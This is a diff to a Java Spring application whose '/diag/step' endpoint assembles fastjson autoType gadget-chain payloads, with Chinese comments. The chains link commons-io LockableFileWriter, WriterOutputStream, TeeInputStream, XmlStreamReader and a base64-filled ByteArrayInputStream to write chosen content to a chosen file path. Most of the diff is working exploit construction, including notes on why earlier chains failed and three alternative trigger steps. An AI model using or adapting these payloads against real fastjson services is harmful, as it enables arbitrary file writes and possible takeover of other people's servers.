@@ -71,6 +71,7 @@ public class App {
         return r;
     }
 
+    /** 纯 Java 链（已确认可用）*/
     @PostMapping("/diag/chain")
     public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
         Map<String, Object> r = new LinkedHashMap<>();
@@ -94,83 +95,76 @@ public class App {
     }
 
     /**
-     * 针对日志分析结果的精确修复测试
+     * 精确诊断：用 ByteArrayInputStream 替换 ReaderInputStream
      *
-     * 根因：
-     *   - charSequence 必须用 fastjson 换行符私有语法注入（step3 已证明可以，但 ReaderInputStream 失败）
-     *   - ReaderInputStream(Reader,String,int) 因 commons-io 2.4 无 -parameters 编译，参数名丢失
-     *     → charsetName 无法匹配 → NullPointerException
-     *   - 解决：只提供 reader 字段，fastjson 选择单参数构造 ReaderInputStream(Reader)
-     *   - WriterOutputStream.writer 字段类型是 Writer，不能用 AutoCloseable，要用 java.io.Writer
+     * 原因：
+     *   - commons-io 2.4 的 ReaderInputStream 编译时无 LocalVariableTable 参数名
+     *   - fastjson 选 3 参数构造函数但 charsetName=null → IllegalArgumentException
+     *   - JDK 自带的 ByteArrayInputStream 保留参数名 "buf"
+     *   - fastjson 可以将 base64 字符串注入为 byte[]
      *
-     * step=A  ReaderInputStream 只传 reader（单参数构造）
-     * step=B  WriterOutputStream.writer 用 java.io.Writer 声明
-     * step=C  完整链（A+B 修复 + 换行符 charSequence + $ref 连接）
+     * step=1  单独测试 ByteArrayInputStream(buf=base64) 能否实例化
+     * step=2  完整链：lfw + wos + bais + tee + xml（替换 ReaderInputStream）
+     * step=3  直接用 $ref 触发 TeeInputStream.read()（不需要 XmlStreamReader）
      */
     @PostMapping("/diag/step")
     public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
-        String step = body.getOrDefault("step", "A");
+        String step = body.getOrDefault("step", "1");
         String file = body.getOrDefault("file", "/tmp/step_" + step);
         String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
         Map<String, Object> r = new LinkedHashMap<>();
         String json = null;
         try {
+            // base64 编码内容（fastjson 注入 byte[] 的标准格式）
+            // 填充到 8193 字节确保 XmlStreamReader 读取足够数据
+            byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
+            byte[] paddedBytes = new byte[Math.max(contentBytes.length, 8193)];
+            System.arraycopy(contentBytes, 0, paddedBytes, 0, contentBytes.length);
+            // 用空格填充剩余部分
+            for (int i = contentBytes.length; i < paddedBytes.length; i++) paddedBytes[i] = (byte) ' ';
+            String b64Content = Base64.getEncoder().encodeToString(paddedBytes);
+
+            String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");
+
             switch (step) {
 
-                case "A":
-                    // ReaderInputStream 只传 reader → fastjson 选 ReaderInputStream(Reader)
-                    // charSequence 用换行符语法（step3 证明可解析）
+                case "1":
+                    // 测试 ByteArrayInputStream(buf=base64) 能否实例化
+                    // JDK ByteArrayInputStream 的构造函数参数名应保留在 LocalVariableTable
                     json = "{\"@type\":\"java.lang.AutoCloseable\","
-                         + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
-                         + "\"reader\":{"
-                             + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
-                             + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + content + "\",}"
-                         + "}}";
+                         + "\"@type\":\"java.io.ByteArrayInputStream\","
+                         + "\"buf\":\"" + b64Content + "\"}";
                     break;
 
-                case "B":
-                    // WriterOutputStream.writer 用 java.io.Writer（而非 AutoCloseable）
-                    json = "{\"@type\":\"java.lang.AutoCloseable\","
-                         + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
-                         + "\"writer\":{"
-                             + "\"@type\":\"java.io.Writer\","
-                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
-                             + "\"file\":\"" + file + "\","
-                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
-                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
-                    break;
-
-                case "C": {
-                    // 完整链：修复所有已知问题
-                    // lfw: LockableFileWriter（顶层 AutoCloseable）
-                    // wos: WriterOutputStream，writer 用 java.io.Writer 声明引用 lfw
-                    // ris: ReaderInputStream 只传 reader（单参数构造）
-                    // tee: TeeInputStream，input=$ref.ris, branch=$ref.wos
-                    // xml: XmlStreamReader，is=$ref.tee，触发读操作驱动数据流
-                    String pad = content + " ".repeat(Math.max(0, 8193 - content.length()));
+                case "2":
+                    // 完整链，用 ByteArrayInputStream 替代 ReaderInputStream
+                    // lfw → wos → bais → tee → xml(触发读操作)
                     json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
+                         // LockableFileWriter：写目标文件
                          + "\"lfw\":{"
                              + "\"@type\":\"java.lang.AutoCloseable\","
                              + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
-                             + "\"file\":\"" + file + "\","
+                             + "\"file\":\"" + escapedFile + "\","
                              + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                         // WriterOutputStream：包装 lfw，用 java.io.Writer expectClass
                          + "\"wos\":{"
                              + "\"@type\":\"java.lang.AutoCloseable\","
                              + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                              + "\"writer\":{\"$ref\":\"$.lfw\"},"
                              + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
-                         + "\"ris\":{"
+                         // ByteArrayInputStream：包含我们的内容（base64注入）
+                         + "\"bais\":{"
                              + "\"@type\":\"java.lang.AutoCloseable\","
-                             + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
-                             + "\"reader\":{"
-                                 + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
-                                 + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + pad + "\",}}},"
+                             + "\"@type\":\"java.io.ByteArrayInputStream\","
+                             + "\"buf\":\"" + b64Content + "\"},"
+                         // TeeInputStream：bais → wos（复制数据到文件）
                          + "\"tee\":{"
                              + "\"@type\":\"java.lang.AutoCloseable\","
                              + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
-                             + "\"input\":{\"$ref\":\"$.ris\"},"
+                             + "\"input\":{\"$ref\":\"$.bais\"},"
                              + "\"branch\":{\"$ref\":\"$.wos\"},"
                              + "\"closeBranch\":true},"
+                         // XmlStreamReader：读取 tee 流，触发 TeeInputStream.read() → 写文件
                          + "\"xml\":{"
                              + "\"@type\":\"java.lang.AutoCloseable\","
                              + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
@@ -180,10 +174,47 @@ public class App {
                              + "\"defaultEncoding\":\"iso-8859-1\"}"
                          + "}";
                     break;
-                }
+
+                case "3":
+                    // 备选触发方式：不用 XmlStreamReader，直接通过 BOMInputStream.$ref 触发
+                    // boms bytes 全零 → 触发 BOMInputStream.getBOM() → 读取 delegate 流
+                    byte[] boms = new byte[paddedBytes.length + 1]; // 全零
+                    StringBuilder bomsJson = new StringBuilder("[");
+                    for (int i = 0; i < boms.length; i++) {
+                        bomsJson.append(0);
+                        if (i < boms.length - 1) bomsJson.append(",");
+                    }
+                    bomsJson.append("]");
+
+                    json = "{\"@type\":\"java.lang.AutoCloseable\","
+                         + "\"@type\":\"com.alibaba.fastjson.JSONObject\","
+                         // 先用 JSONObject 包裹 lfw, wos, bais
+                         + "\"lfw\":{"
+                             + "\"@type\":\"java.lang.AutoCloseable\","
+                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
+                             + "\"file\":\"" + escapedFile + "\","
+                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                         + "\"wos\":{"
+                             + "\"@type\":\"java.lang.AutoCloseable\","
+                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
+                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
+                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
+                         + "\"bais\":{"
+                             + "\"@type\":\"java.lang.AutoCloseable\","
+                             + "\"@type\":\"java.io.ByteArrayInputStream\","
+                             + "\"buf\":\"" + b64Content + "\"},"
+                         + "\"tee\":{"
+                             + "\"@type\":\"java.lang.AutoCloseable\","
+                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
+                             + "\"input\":{\"$ref\":\"$.bais\"},"
+                             + "\"branch\":{\"$ref\":\"$.wos\"},"
+                             + "\"closeBranch\":true},"
+                         + "\"x\":{\"$ref\":\"$.tee\"}"
+                         + "}";
+                    break;
 
                 default:
-                    r.put("ok", false); r.put("msg", "step must be A/B/C"); return r;
+                    r.put("ok", false); r.put("msg", "step must be 1/2/3"); return r;
             }
 
             log.info("[STEP-{}] json len={} preview={}", step, json.length(),
